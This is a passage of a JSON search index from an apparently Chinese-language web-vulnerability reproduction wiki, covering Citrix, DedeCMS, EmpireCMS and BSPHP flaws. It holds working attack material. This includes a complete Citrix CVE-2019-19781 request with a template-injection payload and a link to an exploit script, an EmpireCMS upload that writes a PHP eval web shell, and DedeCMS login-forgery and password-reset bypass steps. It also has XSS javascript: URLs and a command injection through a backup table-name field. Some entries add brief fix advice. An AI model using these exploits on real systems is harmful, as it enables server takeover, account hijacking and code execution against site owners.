/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&","title":"BSPHP\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee"},{"location":"Web%E5%AE%89%E5%85%A8/Citrix/Citrix%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2019-19781%EF%BC%89/","text":"Citrix \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0\uff08CVE-2019-19781\uff09 \u00b6 \u6f0f\u6d1e\u5f71\u54cd \u00b6 Citrix 13.x,12.1,12.0,11.1,10.5 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u65b9\u6cd5\u4e00\uff1a \u6784\u9020\u5982\u4e0b\u6570\u636e\u5305 POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1 Host: target-ip Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.23.0 NSC_NONCE: nsroot NSC_USER: ../../../netscaler/portal/templates/15ffbdca Content-Length: 89 url=http://example.com&title=test&desc=[% template.new('BLOCK' = 'print whoami ') %] \u8bbf\u95ee/vpn/../vpns/portal/test.xml\u5373\u53ef\u8fd4\u56de\u547d\u4ee4\u6267\u884c\u7ed3\u679c \u65b9\u6cd5\u4e8c\uff1a exp\u4e0b\u8f7d\uff1ahttps://codeload.github.com/jas502n/CVE-2019-19781/zip/master python CVE-2019-19781-Citrix-ADC-Remote-Code-Execution.py https://target-ip \u63d0\u793a\u4ee3\u7406\u9519\u8bef\u7684\u8bdd\uff0c\u6302\u672c\u5730\u4ee3\u7406\u5373\u53ef\u3002","title":"Citrix \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0\uff08CVE-2019-19781\uff09"},{"location":"Web%E5%AE%89%E5%85%A8/Citrix/Citrix%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2019-19781%EF%BC%89/#citrix-cve-2019-19781","text":"","title":"Citrix \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0\uff08CVE-2019-19781\uff09"},{"location":"Web%E5%AE%89%E5%85%A8/Citrix/Citrix%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2019-19781%EF%BC%89/#_1","text":"Citrix 13.x,12.1,12.0,11.1,10.5","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/Citrix/Citrix%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2019-19781%EF%BC%89/#_2","text":"\u65b9\u6cd5\u4e00\uff1a \u6784\u9020\u5982\u4e0b\u6570\u636e\u5305 POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1 Host: target-ip Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.23.0 NSC_NONCE: nsroot NSC_USER: ../../../netscaler/portal/templates/15ffbdca Content-Length: 89 url=http://example.com&title=test&desc=[% template.new('BLOCK' = 'print whoami ') %] \u8bbf\u95ee/vpn/../vpns/portal/test.xml\u5373\u53ef\u8fd4\u56de\u547d\u4ee4\u6267\u884c\u7ed3\u679c \u65b9\u6cd5\u4e8c\uff1a exp\u4e0b\u8f7d\uff1ahttps://codeload.github.com/jas502n/CVE-2019-19781/zip/master python CVE-2019-19781-Citrix-ADC-Remote-Code-Execution.py https://target-ip \u63d0\u793a\u4ee3\u7406\u9519\u8bef\u7684\u8bdd\uff0c\u6302\u672c\u5730\u4ee3\u7406\u5373\u53ef\u3002","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u5f71\u54cd\u7248\u672c \u00b6 DedeCms v5.6 \u590d\u73b0 \u00b6 \u6ce8\u518c\u4f1a\u5458\uff0c\u4e0a\u4f20\u8f6f\u4ef6\uff1a\u672c\u5730\u5730\u5740\u4e2d\u586b\u5165 \u751f\u6210x.php \u5bc6\u7801xiao\uff0c\u76f4\u63a5\u751f\u6210\u4e00\u53e5\u8bdd\u3002","title":"DedeCms v5.6 \u5d4c\u5165\u6076\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"DedeCms v5.6","title":"\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","text":"\u6ce8\u518c\u4f1a\u5458\uff0c\u4e0a\u4f20\u8f6f\u4ef6\uff1a\u672c\u5730\u5730\u5740\u4e2d\u586b\u5165 \u751f\u6210x.php \u5bc6\u7801xiao\uff0c\u76f4\u63a5\u751f\u6210\u4e00\u53e5\u8bdd\u3002","title":"\u590d\u73b0"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/","text":"\u8be5\u6f0f\u6d1e\u7684\u89e6\u53d1\u70b9\u4e3a/dede/tag_test_action.php\u3002\u8d77\u56e0\u662fcsrf_check()\u7684\u7ed5\u8fc7\uff0c\u5bfc\u81f4\u53ef\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 POC: \u00b6 \u5229\u7528\u6761\u4ef6\uff1a\u767b\u5f55\u540e\u53f0 \u89e3\u51b3\u65b9\u6848\uff1a\u91cd\u65b0\u5b9e\u73b0csrf_check()\u51fd\u6570","title":"Dedecms V5.7\u540e\u53f0\u4efb\u610f\u4ee3\u7801\u6267\u884cCVE-2018-7700"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/#poc","text":"\u5229\u7528\u6761\u4ef6\uff1a\u767b\u5f55\u540e\u53f0 \u89e3\u51b3\u65b9\u6848\uff1a\u91cd\u65b0\u5b9e\u73b0csrf_check()\u51fd\u6570","title":"POC:"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 DedeCMS 5.7 \u6f0f\u6d1ePOC \u00b6","title":"Dedecms swf\u6587\u4ef6\u53cd\u5c04\u578bxss"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#_1","text":"DedeCMS 5.7","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#poc","text":"","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/","text":"\u5f71\u54cd\u7248\u672c \u00b6 dedecmsV5.7 SP2 \u6f0f\u6d1e\u6210\u56e0 \u00b6 \u5728\u7528\u6237\u5bc6\u7801\u91cd\u7f6e\u529f\u80fd\u5904\uff0cphp\u5b58\u5728\u5f31\u7c7b\u578b\u6bd4\u8f83\uff0c\u5bfc\u81f4\u5982\u679c\u7528\u6237\u6ca1\u6709\u8bbe\u7f6e\u5bc6\u4fdd\u95ee\u9898\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u7ed5\u8fc7\u9a8c\u8bc1\u5bc6\u4fdd\u95ee\u9898\uff0c\u76f4\u63a5\u4fee\u6539\u5bc6\u7801(\u7ba1\u7406\u5458\u8d26\u6237\u9ed8\u8ba4\u4e0d\u8bbe\u7f6e\u5bc6\u4fdd\u95ee\u9898)\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\u4fee\u6539\u7684\u5bc6\u7801\u662fmember\u8868\u4e2d\u7684\u5bc6\u7801\uff0c\u5373\u4f7f\u4fee\u6539\u4e86\u7ba1\u7406\u5458\u5bc6\u7801\u4e5f\u662fmember\u8868\u4e2d\u7684\u7ba1\u7406\u5458\u5bc6\u7801\uff0c\u4ecd\u662f\u65e0\u6cd5\u8fdb\u5165\u7ba1\u7406 \u590d\u73b0 \u00b6 \u5728\u627e\u56de\u5bc6\u7801\u5904\uff0c\u70b9\u51fb\u901a\u8fc7\u5b89\u5168\u95ee\u9898\u53d6\u56de \u586b\u5199\u4fe1\u606f\u5e76\u6293\u5305\uff0c\u4fee\u6539id\u548cuserid\u4e3a\u60f3\u8981\u91cd\u7f6e\u5bc6\u7801\u7684\u5bf9\u8c61\uff0c\u518d\u52a0\u4e0a\u4ee5\u4e0a\u5206\u6790\u5185\u5bb9\uff0c\u53d1\u5305\u5373\u53ef\u5f97\u5230\u4fee\u6539\u5bc6\u7801url \u8fdb\u5165\u8be5url\uff0c\u4fee\u6539\u5bc6\u7801\u3002 \u4fee\u590d\u610f\u89c1 \u00b6 \u6539\u4e3a\u5f3a\u7c7b\u578b\u6bd4\u8f83","title":"Dedecms \u524d\u53f0\u4efb\u610f\u7528\u6237\u5bc6\u7801\u4fee\u6539"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/#_1","text":"dedecmsV5.7 SP2","title":"\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/#_2","text":"\u5728\u7528\u6237\u5bc6\u7801\u91cd\u7f6e\u529f\u80fd\u5904\uff0cphp\u5b58\u5728\u5f31\u7c7b\u578b\u6bd4\u8f83\uff0c\u5bfc\u81f4\u5982\u679c\u7528\u6237\u6ca1\u6709\u8bbe\u7f6e\u5bc6\u4fdd\u95ee\u9898\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u7ed5\u8fc7\u9a8c\u8bc1\u5bc6\u4fdd\u95ee\u9898\uff0c\u76f4\u63a5\u4fee\u6539\u5bc6\u7801(\u7ba1\u7406\u5458\u8d26\u6237\u9ed8\u8ba4\u4e0d\u8bbe\u7f6e\u5bc6\u4fdd\u95ee\u9898)\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\u4fee\u6539\u7684\u5bc6\u7801\u662fmember\u8868\u4e2d\u7684\u5bc6\u7801\uff0c\u5373\u4f7f\u4fee\u6539\u4e86\u7ba1\u7406\u5458\u5bc6\u7801\u4e5f\u662fmember\u8868\u4e2d\u7684\u7ba1\u7406\u5458\u5bc6\u7801\uff0c\u4ecd\u662f\u65e0\u6cd5\u8fdb\u5165\u7ba1\u7406","title":"\u6f0f\u6d1e\u6210\u56e0"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/#_3","text":"\u5728\u627e\u56de\u5bc6\u7801\u5904\uff0c\u70b9\u51fb\u901a\u8fc7\u5b89\u5168\u95ee\u9898\u53d6\u56de \u586b\u5199\u4fe1\u606f\u5e76\u6293\u5305\uff0c\u4fee\u6539id\u548cuserid\u4e3a\u60f3\u8981\u91cd\u7f6e\u5bc6\u7801\u7684\u5bf9\u8c61\uff0c\u518d\u52a0\u4e0a\u4ee5\u4e0a\u5206\u6790\u5185\u5bb9\uff0c\u53d1\u5305\u5373\u53ef\u5f97\u5230\u4fee\u6539\u5bc6\u7801url \u8fdb\u5165\u8be5url\uff0c\u4fee\u6539\u5bc6\u7801\u3002","title":"\u590d\u73b0"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/#_4","text":"\u6539\u4e3a\u5f3a\u7c7b\u578b\u6bd4\u8f83","title":"\u4fee\u590d\u610f\u89c1"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/","text":"\u5f71\u54cd\u7248\u672c \u00b6 dedecmsV5.7 SP2 \u6f0f\u6d1e\u6210\u56e0 \u00b6 dedecms\u7684\u4f1a\u5458\u6a21\u5757\u7684\u8eab\u4efd\u8ba4\u8bc1\u4f7f\u7528\u7684\u662f\u5ba2\u6237\u7aefsession\uff0c\u5728Cookie\u4e2d\u5199\u5165\u7528\u6237ID\u5e76\u4e14\u9644\u4e0aID__ckMd5\uff0c\u7528\u505a\u7b7e\u540d\u3002\u4e3b\u9875\u5b58\u5728\u903b\u8f91\u6f0f\u6d1e\uff0c\u5bfc\u81f4\u53ef\u4ee5\u8fd4\u56de\u6307\u5b9auid\u7684ID\u7684Md5\u6563\u5217\u503c\u3002\u539f\u7406\u4e0a\u53ef\u4ee5\u4f2a\u9020\u4efb\u610f\u7528\u6237\u767b\u5f55\u3002 \u590d\u73b0 \u00b6 \u73b0\u5728\u6211\u4eec\u7684\u601d\u8def\u5c31\u662f \u5148\u4ecemember/index.php\u4e2d\u83b7\u53d6\u4f2a\u9020\u7684DedeUserID\u548c\u5b83\u5bf9\u4e8e\u7684md5 \u4f7f\u7528\u5b83\u767b\u5f55 \u8bbf\u95eemember/index.php?uid=0000001\u5e76\u6293\u5305(\u6ce8\u610fcookie\u4e2dlast_vid\u503c\u5e94\u8be5\u4e3a\u7a7a)\u3002 \u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u83b7\u53d6\u5230\u4e86\uff0c\u62ff\u53bb\u5f53\u505aDeDeUserID \u53ef\u4ee5\u770b\u5230\uff0c\u767b\u9646\u4e86admin\u7528\u6237\u3002 \u4fee\u590d\u610f\u89c1 \u00b6 M_ID\u88abintval\u540e\u8fd8\u8981\u5224\u65ad\u662f\u5426\u4e0e\u672aintval\u4e4b\u524d\u76f8\u540c\u3002","title":"Dedecms\u4efb\u610f\u7528\u6237\u767b\u5f55SSV-97087"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/#_1","text":"dedecmsV5.7 SP2","title":"\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/#_2","text":"dedecms\u7684\u4f1a\u5458\u6a21\u5757\u7684\u8eab\u4efd\u8ba4\u8bc1\u4f7f\u7528\u7684\u662f\u5ba2\u6237\u7aefsession\uff0c\u5728Cookie\u4e2d\u5199\u5165\u7528\u6237ID\u5e76\u4e14\u9644\u4e0aID__ckMd5\uff0c\u7528\u505a\u7b7e\u540d\u3002\u4e3b\u9875\u5b58\u5728\u903b\u8f91\u6f0f\u6d1e\uff0c\u5bfc\u81f4\u53ef\u4ee5\u8fd4\u56de\u6307\u5b9auid\u7684ID\u7684Md5\u6563\u5217\u503c\u3002\u539f\u7406\u4e0a\u53ef\u4ee5\u4f2a\u9020\u4efb\u610f\u7528\u6237\u767b\u5f55\u3002","title":"\u6f0f\u6d1e\u6210\u56e0"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/#_3","text":"\u73b0\u5728\u6211\u4eec\u7684\u601d\u8def\u5c31\u662f \u5148\u4ecemember/index.php\u4e2d\u83b7\u53d6\u4f2a\u9020\u7684DedeUserID\u548c\u5b83\u5bf9\u4e8e\u7684md5 \u4f7f\u7528\u5b83\u767b\u5f55 \u8bbf\u95eemember/index.php?uid=0000001\u5e76\u6293\u5305(\u6ce8\u610fcookie\u4e2dlast_vid\u503c\u5e94\u8be5\u4e3a\u7a7a)\u3002 \u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u83b7\u53d6\u5230\u4e86\uff0c\u62ff\u53bb\u5f53\u505aDeDeUserID \u53ef\u4ee5\u770b\u5230\uff0c\u767b\u9646\u4e86admin\u7528\u6237\u3002","title":"\u590d\u73b0"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/#_4","text":"M_ID\u88abintval\u540e\u8fd8\u8981\u5224\u65ad\u662f\u5426\u4e0e\u672aintval\u4e4b\u524d\u76f8\u540c\u3002","title":"\u4fee\u590d\u610f\u89c1"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/","text":"\u5f71\u54cd\u7248\u672c \u00b6 dedecmsV5.7 SP2 \u6f0f\u6d1e\u6210\u56e0 \u00b6 \u7ba1\u7406\u5458\u7528\u6237\u524d\u53f0\u53ef\u4ee5\u7ed5\u8fc7\u9650\u5236\u4e0a\u4f20shell \u590d\u73b0 \u00b6 \u767b\u5f55\u5e76\u8fdb\u5165member/article_add.php\u53d1\u5e03\u6587\u7ae0\uff0c\u9009\u62e9\u4e0b\u9762\u7684\u5bcc\u6587\u672c\u7f16\u8f91\u5668\u63d2\u5165\u56fe\u7247 \u9009\u62e9\u597dshell\u5e76\u4e0a\u4f20\u6293\u5305 \u5411\u5982\u4e0a\u5206\u6790\u4fee\u6539\u6587\u4ef6\u540d\u4e0econtent-type\uff0c\u5373\u53ef\u8fd4\u56deshell\u5730\u5740 \u4fee\u590d\u610f\u89c1 \u00b6 \u5728\u6700\u540e\u62fc\u63a5\u6587\u4ef6\u540d\u65f6\u518d\u5224\u65ad\u4e00\u6b21\u3002","title":"Dedecms\u524d\u53f0\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1eCVE-2018-20129"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/#_1","text":"dedecmsV5.7 SP2","title":"\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/#_2","text":"\u7ba1\u7406\u5458\u7528\u6237\u524d\u53f0\u53ef\u4ee5\u7ed5\u8fc7\u9650\u5236\u4e0a\u4f20shell","title":"\u6f0f\u6d1e\u6210\u56e0"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/#_3","text":"\u767b\u5f55\u5e76\u8fdb\u5165member/article_add.php\u53d1\u5e03\u6587\u7ae0\uff0c\u9009\u62e9\u4e0b\u9762\u7684\u5bcc\u6587\u672c\u7f16\u8f91\u5668\u63d2\u5165\u56fe\u7247 \u9009\u62e9\u597dshell\u5e76\u4e0a\u4f20\u6293\u5305 \u5411\u5982\u4e0a\u5206\u6790\u4fee\u6539\u6587\u4ef6\u540d\u4e0econtent-type\uff0c\u5373\u53ef\u8fd4\u56deshell\u5730\u5740","title":"\u590d\u73b0"},{"location":"Web%E5%AE%89%E5%85%A8/Dedecms/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/#_4","text":"\u5728\u6700\u540e\u62fc\u63a5\u6587\u4ef6\u540d\u65f6\u518d\u5224\u65ad\u4e00\u6b21\u3002","title":"\u4fee\u590d\u610f\u89c1"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 EmpireCMS <= 7.5 \u6f0f\u6d1e\u9a8c\u8bc1 \u00b6 1.\u8fdb\u5165\u540e\u53f0\u5982\u4e0b\u754c\u9762\uff0c\u70b9\u51fb\u5bfc\u5165\u7cfb\u7edf\u6a21\u578b 2.\u6784\u9020\u6587\u4ef6a.mod,\u5185\u5bb9\u5982\u4e0b <?php file_put_contents(\"shell.php\",\"<?php @eval(\\$_POST[cmd]);?>\");?> 3.\u4e0a\u4f20\u6587\u4ef6a.mod 4.\u67e5\u770b\u6587\u4ef6\u5df2\u7ecf\u6709shell.php\u4e86\uff0c\u83dc\u5200\u8fde\u63a5\u5373\u53ef","title":"EmpireCMS V7.5\u540e\u53f0getshell\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/#_1","text":"EmpireCMS <= 7.5","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/#_2","text":"1.\u8fdb\u5165\u540e\u53f0\u5982\u4e0b\u754c\u9762\uff0c\u70b9\u51fb\u5bfc\u5165\u7cfb\u7edf\u6a21\u578b 2.\u6784\u9020\u6587\u4ef6a.mod,\u5185\u5bb9\u5982\u4e0b <?php file_put_contents(\"shell.php\",\"<?php @eval(\\$_POST[cmd]);?>\");?> 3.\u4e0a\u4f20\u6587\u4ef6a.mod 4.\u67e5\u770b\u6587\u4ef6\u5df2\u7ecf\u6709shell.php\u4e86\uff0c\u83dc\u5200\u8fde\u63a5\u5373\u53ef","title":"\u6f0f\u6d1e\u9a8c\u8bc1"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 EmpireCMS <=7.5 \u6f0f\u6d1ePOC \u00b6 \u9700\u8981\u6709\u540e\u53f0\u6743\u9650 http://********/e/admin/openpage/AdminPage.php?mainfile=javascript:alert(/xss/) \u82e5\u63d0\u793a\u975e\u6cd5\u6765\u6e90\u52a0\u5165\u53c2\u6570hash\u53c2\u6570\uff0c\u4f8b\uff1aehash_gxCQz=zERR2KY6NAMicC0c5OYv,\u5982\u4e0b http://********/e/admin/openpage/AdminPage.php?mainfile=javascript:alert(/xss/)&ehash_gxCQz=zERR2KY6NAMicC50Yv","title":"EmpireCMS V7.5\u540e\u53f0xss\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/#_1","text":"EmpireCMS <=7.5","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/#poc","text":"\u9700\u8981\u6709\u540e\u53f0\u6743\u9650 http://********/e/admin/openpage/AdminPage.php?mainfile=javascript:alert(/xss/) \u82e5\u63d0\u793a\u975e\u6cd5\u6765\u6e90\u52a0\u5165\u53c2\u6570hash\u53c2\u6570\uff0c\u4f8b\uff1aehash_gxCQz=zERR2KY6NAMicC0c5OYv,\u5982\u4e0b http://********/e/admin/openpage/AdminPage.php?mainfile=javascript:alert(/xss/)&ehash_gxCQz=zERR2KY6NAMicC50Yv","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 EmpireCMS V7.5 \u6f0f\u6d1e\u9a8c\u8bc1 \u00b6 \u9700\u8981\u6709\u540e\u53f0\u6743\u9650\u3002 1.\u767b\u5165\u540e\u53f0\u7ba1\u7406\u9875\u9762 2.\u70b9\u51fb\u7cfb\u7edf->\u5907\u4efd->\u5907\u4efd\u6570\u636e 3.\u968f\u4fbf\u9009\u62e9\u4e00\u4e2a\u8868\uff0c\u70b9\u51fb\u6700\u4e0b\u9762\u7684\u5f00\u59cb\u5907\u4efd\uff0c\u6293\u5305 4.\u6293\u5305\u540e\u4fee\u6539tablename\u5b57\u6bb5\u4e3a\u547d\u4ee4\u6267\u884c\u8bed\u53e5 5.\u8fd4\u56de\u9875\u9762 6.\u8bbf\u95ee\u5907\u4efd\u8def\u5f84\u4e0bconfig.php\u4ea6\u53ef 7.\u67e5\u770bconfig.php,\u547d\u4ee4\u5df2\u7ecf\u5199\u8fdb\u53bb\u4e86","title":"EmpireCMS V7.5\u540e\u53f0\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"EmpireCMS V7.5","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","text":"\u9700\u8981\u6709\u540e\u53f0\u6743\u9650\u3002 1.\u767b\u5165\u540e\u53f0\u7ba1\u7406\u9875\u9762 2.\u70b9\u51fb\u7cfb\u7edf->\u5907\u4efd->\u5907\u4efd\u6570\u636e 3.\u968f\u4fbf\u9009\u62e9\u4e00\u4e2a\u8868\uff0c\u70b9\u51fb\u6700\u4e0b\u9762\u7684\u5f00\u59cb\u5907\u4efd\uff0c\u6293\u5305 4.\u6293\u5305\u540e\u4fee\u6539tablename\u5b57\u6bb5\u4e3a\u547d\u4ee4\u6267\u884c\u8bed\u53e5 5.\u8fd4\u56de\u9875\u9762 6.\u8bbf\u95ee\u5907\u4efd\u8def\u5f84\u4e0bconfig.php\u4ea6\u53ef 7.\u67e5\u770bconfig.php,\u547d\u4ee4\u5df2\u7ecf\u5199\u8fdb\u53bb\u4e86","title":"\u6f0f\u6d1e\u9a8c\u8bc1"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS%20%E5%85%A8%E7%89%88%E6%9C%ACXSS%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 EmpireCMS \u5168\u7248\u672c <7.5 \u6f0f\u6d1ePOC \u00b6 http://*******/e/ViewImg/index.html?url=javascript:alert(/xss/)","title":"EmpireCMS \u5168\u7248\u672cXSS\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS%20%E5%85%A8%E7%89%88%E6%9C%ACXSS%E6%BC%8F%E6%B4%9E/#_1","text":"EmpireCMS \u5168\u7248\u672c <7.5","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS%20%E5%85%A8%E7%89%88%E6%9C%ACXSS%E6%BC%8F%E6%B4%9E/#poc","text":"http://*******/e/ViewImg/index.html?url=javascript:alert(/xss/)","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/EmpireCMS/EmpireCMS/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 EmpireCMS <= V7.5 \u6f0f\u6d1e\u9a8c\u8bc1 \u00b6 